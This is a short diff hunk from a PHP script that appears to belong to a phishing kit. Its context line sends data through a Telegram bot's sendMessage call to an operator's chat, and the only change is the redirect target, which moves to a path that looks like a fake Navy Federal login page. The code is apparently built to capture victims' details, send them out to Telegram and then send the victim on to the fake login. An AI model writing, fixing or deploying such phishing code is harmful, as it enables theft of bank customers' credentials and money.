@@ -30,6 +30,6 @@ file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$c
 
 
 
-header("Location: /navy_fed/login");
+header("Location: /navy_fed/login.php");
 
 ?>
